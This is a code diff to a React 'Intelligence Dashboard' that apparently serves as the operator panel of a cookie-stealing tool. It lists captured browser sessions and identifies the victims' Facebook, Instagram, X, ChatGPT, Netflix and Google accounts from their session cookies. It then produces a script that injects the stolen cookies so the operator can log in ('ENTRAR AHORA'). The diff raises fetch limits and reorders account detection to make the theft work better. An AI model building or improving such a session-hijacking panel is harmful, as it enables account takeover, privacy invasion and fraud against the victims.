@@ -18,7 +18,6 @@ interface AccountInfo {
   health: "active" | "expiring" | "expired";
 }
 
-// Relative time formatter
 const formatRelativeTime = (date: string) => {
   const now = new Date();
   const captured = new Date(date);
@@ -44,18 +43,17 @@ export default function SessionsPage() {
 
   useEffect(() => {
     fetchSessions();
-    const timer = setInterval(() => setCurrentTime(new Date()), 30000); // UI Refresh every 30s
+    const timer = setInterval(() => setCurrentTime(new Date()), 30000);
     return () => clearInterval(timer);
   }, []);
 
-  const getHealthStatus = (cookies: Cookie[]): "active" | "expiring" | "expired" => {
-    if (!cookies || cookies.length === 0) return "expired";
+  const getHealthStatus = (sessionCookies: Cookie[]): "active" | "expiring" | "expired" => {
+    if (!sessionCookies || sessionCookies.length === 0) return "active"; // Non-expiring fallback
     const now = Date.now() / 1000;
     const oneWeek = 7 * 24 * 60 * 60;
     
-    // Look for high-importance session cookies
-    const indicators = ["c_user", "ds_user_id", "auth_token", "__Secure-next-auth.session-token", "SID", "NetflixId", "li_at", "ajs_user_id"];
-    const sessionCookie = cookies.find(c => indicators.includes(c.name));
+    const indicators = ["c_user", "ds_user_id", "auth_token", "__Secure-next-auth.session-token", "SID", "NetflixId"];
+    const sessionCookie = sessionCookies.find(c => indicators.includes(c.name));
 
     if (!sessionCookie || !sessionCookie.expiration_date) return "active";
     if (sessionCookie.expiration_date < now) return "expired";
@@ -67,8 +65,21 @@ export default function SessionsPage() {
     const health = getHealthStatus(sessionCookies);
     const domainStr = sessionCookies.map(c => c.domain.toLowerCase()).join(" ");
 
-    // Detection Logic based on Domain
-    if (domainStr.includes("openai.com") || domainStr.includes("chatgpt.com")) 
+    // 1. Check for specific identifier cookies first (High confidence)
+    if (domainStr.includes("facebook.com")) {
+      const fbId = sessionCookies.find(c => c.name === "c_user")?.value;
+      return { platform: "Facebook", identifier: fbId || "Facebook User", icon: Facebook, color: "text-blue-500", health };
+    }
+    if (domainStr.includes("instagram.com")) {
+      const igId = sessionCookies.find(c => c.name === "ds_user_id")?.value;
+      return { platform: "Instagram", identifier: igId || "Instagram Account", icon: Instagram, color: "text-pink-500", health };
+    }
+    if (domainStr.includes("x.com") || domainStr.includes("twitter.com")) {
+      return { platform: "X / Twitter", identifier: "Social Account", icon: Twitter, color: "text-blue-400", health };
+    }
+
+    // 2. Fallback to general domain match
+    if (domainStr.includes("chatgpt.com") || domainStr.includes("openai.com")) 
       return { platform: "ChatGPT", identifier: "AI Assistant", icon: MessageSquare, color: "text-emerald-400", health };
     
     if (domainStr.includes("kick.com"))
@@ -77,21 +88,8 @@ export default function SessionsPage() {
     if (domainStr.includes("openart.ai") || domainStr.includes("nijijourney.com") || domainStr.includes("midjourney.com"))
       return { platform: "AI Arts", identifier: "Creator", icon: Palette, color: "text-purple-400", health };
 
-    if (domainStr.includes("x.com") || domainStr.includes("twitter.com"))
-      return { platform: "X / Twitter", identifier: "Social", icon: Twitter, color: "text-blue-400", health };
-
     if (domainStr.includes("netflix.com"))
       return { platform: "Netflix", identifier: "Viewer", icon: Play, color: "text-red-600", health };
-
-    if (domainStr.includes("facebook.com")) {
-      const fbId = sessionCookies.find(c => c.name === "c_user")?.value;
-      return { platform: "Facebook", identifier: fbId || "Facebook User", icon: Facebook, color: "text-blue-500", health };
-    }
-
-    if (domainStr.includes("instagram.com")) {
-      const igId = sessionCookies.find(c => c.name === "ds_user_id")?.value;
-      return { platform: "Instagram", identifier: igId || "Instagram User", icon: Instagram, color: "text-pink-500", health };
-    }
 
     if (domainStr.includes("yahoo.com"))
       return { platform: "Yahoo", identifier: "Mail User", icon: Mail, color: "text-purple-600", health };
@@ -102,11 +100,12 @@ export default function SessionsPage() {
     if (domainStr.includes("google.com"))
       return { platform: "Google", identifier: "Google User", icon: Globe, color: "text-red-400", health };
 
-    // Default match by cookie names if domain focus fails
-    const botDetect = sessionCookies.find(c => c.name.toLowerCase().includes("token") || c.name.toLowerCase().includes("session"));
-    if (botDetect) return { platform: "Generic App", identifier: "Active User", icon: Bot, color: "text-amber-400", health };
+    // 3. Catch-all for non-identified sessions that have some cookies
+    if (sessionCookies.length > 0) {
+      return { platform: "App / Web", identifier: "Active Session", icon: Bot, color: "text-amber-400", health };
+    }
 
-    return { platform: "Unknown", identifier: fallbackId || "Generic Session", icon: Shield, color: "text-gray-400", health: "active" };
+    return { platform: "Unknown", identifier: fallbackId || "Anonymous", icon: Shield, color: "text-gray-400", health: "active" };
   };
 
   const fetchSessions = async () => {
@@ -115,15 +114,18 @@ export default function SessionsPage() {
       .from("session_snapshots")
       .select("*")
       .order("captured_at", { ascending: false })
-      .limit(50);
+      .limit(40);
     
     if (sessionData) {
       setSessions(sessionData);
       const sessionIds = sessionData.map(s => s.id);
+      
+      // OPTIMIZATION: Fetch more cookies (limit 5000) and ensure they are sorted/complete
       const { data: cookieData } = await supabase
         .from("cookies")
         .select("*")
-        .in("snapshot_id", sessionIds);
+        .in("snapshot_id", sessionIds)
+        .limit(5000); // Massive boost to avoid pagination limits
       
       const newAccountMap: Record<string, AccountInfo> = {};
       sessionData.forEach(session => {
@@ -140,7 +142,8 @@ export default function SessionsPage() {
     const { data } = await supabase
       .from("cookies")
       .select("*")
-      .eq("snapshot_id", snapshotId);
+      .eq("snapshot_id", snapshotId)
+      .limit(1000);
     if (data) setCookies(data);
     setLoadingCookies(false);
   };
@@ -163,7 +166,7 @@ export default function SessionsPage() {
     document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/;domain=" + location.hostname.replace(/^www\./, "."));
   });
 
-  console.log('%c [SessionSafe] Inyectando Nuevos Datos... ', 'background: #2563eb; color: #fff; font-weight: bold; border-radius: 4px; padding: 5px;');
+  console.log('%c [SessionSafe] Inyectando ' + cookies.length + ' cookies... ', 'background: #2563eb; color: #fff; font-weight: bold; border-radius: 4px; padding: 5px;');
   
   cookies.forEach(c => {
     try {
@@ -199,7 +202,7 @@ export default function SessionsPage() {
       <header className="flex flex-col md:flex-row md:items-center justify-between gap-4">
         <div>
           <h2 className="text-3xl font-bold tracking-tight">Intelligence Dashboard</h2>
-          <p className="text-gray-400">Monitoring {sessions.length} sessions across all detected domains.</p>
+          <p className="text-gray-400">Monitoring {sessions.length} sessions with domain-level intelligence.</p>
         </div>
         
         <div className="flex items-center gap-3">
@@ -207,7 +210,7 @@ export default function SessionsPage() {
             <Search className="text-gray-500 mr-2" size={18} />
             <input 
               type="text" 
-              placeholder="Search domain or ID..." 
+              placeholder="Search platform or ID..." 
               className="bg-transparent border-none outline-none text-sm w-full py-2"
               value={searchTerm}
               onChange={(e) => setSearchTerm(e.target.value)}
@@ -226,7 +229,7 @@ export default function SessionsPage() {
       ) : (
         <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-6">
           {filteredSessions.map((session, idx) => {
-            const info = accountMap[session.id] || { platform: "Unknown", identifier: session.user_id, icon: Shield, color: "text-gray-500", health: "active" };
+            const info = accountMap[session.id] || { platform: "Unknown", identifier: "Anonymous", icon: Shield, color: "text-gray-500", health: "active" };
             return (
               <motion.div
                 key={session.id}
@@ -289,25 +292,18 @@ export default function SessionsPage() {
                     <div>
                       <div className="flex items-center gap-3">
                         <h3 className="text-2xl font-bold">{accountMap[selectedSession.id]?.identifier}</h3>
-                        {accountMap[selectedSession.id]?.health === "active" && (
-                          <div className="flex items-center gap-1 text-emerald-400 text-[10px] font-bold bg-emerald-500/10 px-2 py-0.5 rounded-lg border border-emerald-500/20">
-                            VERIFIED ACTIVE
-                          </div>
-                        )}
+                        <div className="text-[10px] font-bold text-blue-400 bg-blue-500/10 px-2 py-0.5 rounded-lg border border-blue-500/20">
+                          {cookies.length} COOKIES FETCHED
+                        </div>
                       </div>
-                      <p className="text-gray-400">Advanced injection ready for {accountMap[selectedSession.id]?.platform.toLowerCase()}</p>
+                      <p className="text-gray-400 capitalize">Advanced inyecting for {accountMap[selectedSession.id]?.platform}</p>
                     </div>
                   </div>
                   
                   <div className="flex gap-4">
-                    <button 
-                      onClick={() => setSelectedSession(null)}
-                      className="px-6 py-4 rounded-2xl glass hover:bg-white/10 transition-colors font-bold text-gray-400"
-                    >
-                      Cerrar
-                    </button>
-                    <button onClick={copyToClipboard} className={"flex items-center gap-3 px-10 py-4 rounded-2xl transition-all font-black text-xl shadow-2xl active:scale-95 group " + (copied ? "bg-emerald-600 shadow-emerald-600/30" : "bg-blue-600 hover:bg-blue-500 shadow-blue-600/30")}>
-                      {copied ? <><Check size={24} /> ¡COPIADO!</> : <><Copy size={24} /> ENTRAR AHORA</>}
+                    <button onClick={() => setSelectedSession(null)} className="px-6 py-4 rounded-2xl glass hover:bg-white/10 transition-colors font-bold text-gray-400">Cerrar</button>
+                    <button onClick={copyToClipboard} className={"flex items-center gap-3 px-10 py-4 rounded-2xl transition-all font-black text-xl shadow-2xl active:scale-95 group " + (copied ? "bg-emerald-600" : "bg-blue-600 hover:bg-blue-500")}>
+                      {copied ? <><Check size={24} /> COPIADO</> : <><Copy size={24} /> ENTRAR AHORA</>}
                     </button>
                   </div>
                 </div>
